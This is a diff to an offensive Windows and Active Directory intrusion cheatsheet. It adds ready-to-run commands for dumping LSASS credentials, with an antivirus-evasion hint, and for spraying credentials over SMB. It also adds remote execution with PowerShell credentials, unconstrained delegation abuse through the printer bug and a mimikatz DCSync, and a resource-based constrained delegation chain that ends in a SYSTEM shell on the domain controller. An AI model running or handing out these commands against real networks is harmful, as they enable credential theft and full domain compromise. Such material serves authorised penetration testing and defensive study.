@@ -37,11 +37,12 @@ A cheatsheet in order to help during intrusion steps on Windows environment.
       - [mimikatz](#mimikatz-1)
   - [Lateral Movement](#lateral-movement)
     - [CrackMapExec](#crackmapexec)
+    - [Powershell Remoting](#powershell-remoting)
+    - [RCE with PS Credentials](#rce-with-ps-credentials)
     - [Delegation](#delegation)
       - [Unconstrained Delegation](#unconstrained-delegation)
       - [Constrained Delegation](#constrained-delegation)
-    - [Powershell Remoting](#powershell-remoting)
-    - [RCE with PS Credentials](#rce-with-ps-credentials)
+      - [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
       
 ## Tools
 - Kerbrute
@@ -399,8 +400,12 @@ lsassy -d <domain_name> -u <user> -p <password> -dc-ip 10.10.10.10 -r --procdump
 ```
 ##### Procdump
 ```
+# Dump lsass memory (PID might bypass AVs)
 .\procdump64.exe -accepteula -ma lsass.exe lsass
 .\procdump64.exe -accepteula -ma <lsass_pid> lsass
+
+# Parse the dump locally on windows (see above) or with pypykatz
+pypykatz lsa minidump lsass.dmp
 ```
 
 #### SAM
@@ -438,13 +443,74 @@ SHA1 of masterkey:6b82b138e1a6b77f4c55a8df728288f56a3b6d5f
 ### Lateral Movement
 
 #### CrackMapExec
+```
+# There are many ways to do that, here is an example
+crackmapexec smb hosts.list -u <user> -p <password> --shares --continue-on-success
+```
+#### Powershell Remoting
+```
+# Enable Powershell Remoting on current Machine (need admin)
+Enable-PSRemoting -force
+
+# Create and enter into a new PSSession
+$user = "DOMAIN\User" ;$s= "password";$ss = Convertto-securestring -string $s -AsPlainText -Force;$Credential = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $ss;
+
+New-PSSession -Credential $Credential | Enter-PSSession
+```
+#### Rce with PS credentials
+```
+$user = "DOMAIN\User" ;$s= "password";$ss = Convertto-securestring -string $s -AsPlainText -Force;$Credential = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $ss;
+
+Invoke-Command -ComputerName <target_computer> -Credential $Credential -ScriptBlock { whoami }
+```
 
 #### Delegation
 
 ##### Unconstrained Delegation
+When we have admin rights on a machine with the `TrustedForDelegation` attribute we can abuse it in order elevate our privileges to domain admin.
+Note: it can be used to compromise another forest if the 2 forests have bidirectional relations and `TGTDelegation` set to True.
+Goal: make a privileged user connect to our compromise machine.
+```
+# Monitoring incomings TGTs with rubeus:
+.\rubeus.exe monitor /interval:2 /filteruser:DC01$
+
+# Execute the printerbug to trigger the force authentication of the target DC to our machine (DC01 is compromised)
+.\spoolsample.exe DC02.DOMAIN2.FQDN DC01.DOMAIN.FQDN
+
+# Get the base64 captured TGT from Rubeus and inject it into memory:
+.\rubeus.exe ptt /ticket:<base64_of_captured_ticket>
+
+# Dump the hashes of the target domain using mimikatz:
+.\mimikatz.exe "lsadump::dcsync /domain:DOMAIN2.FQDNM /user:DOMAIN2\Administrator" exit
+```
 
 ##### Constrained Delegation
+TODO
 
-#### Powershell Remoting
+##### Resource-Based Constrained Delegation
+If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate a Domain Administrator.
+```
+# Use Powermad to create a new machine account
+New-MachineAccount -MachineAccount <machine_name> -Password $(ConvertTo-SecureString '<machine_password>' -AsPlainText -Force) -Verbose
 
-#### Rce with PS credentials
+# Use PowerView and get the SID value of our new machine
+$ComputerSid = Get-DomainComputer <machine_name> -Properties objectsid | Select -Expand objectsid
+
+# Then by using the SID we have to build a ACE for the new created machine account
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+
+# Set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over
+Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+
+# Use rubeus to get the RC4 hash of the machine account
+.\rubeus.exe hash /password:<machine_password> /user:<machine_name> /domain:DOMAIN.FQDN
+RC4 hash -> 48FC3FC78D26CA2DA2B17C7751EAB6BD
+
+# Execute the impersonation and get a TGS as Domain Administrator for the service cifs on the DC
+.\rubeus.exe s4u /user:<user> /rc4:<rc4_hash> /impersonateuser:<target_user(Administrator)> /msdsspn:cifs/DC.DOMAIN.FQDN /domain:DC.DOMAIN.FQDN /ptt
+
+# Get a session on the DC
+.\PsExec64.exe -accepteula \\DC.DOMAIN.FQDN\ -s powershell.exe
+```
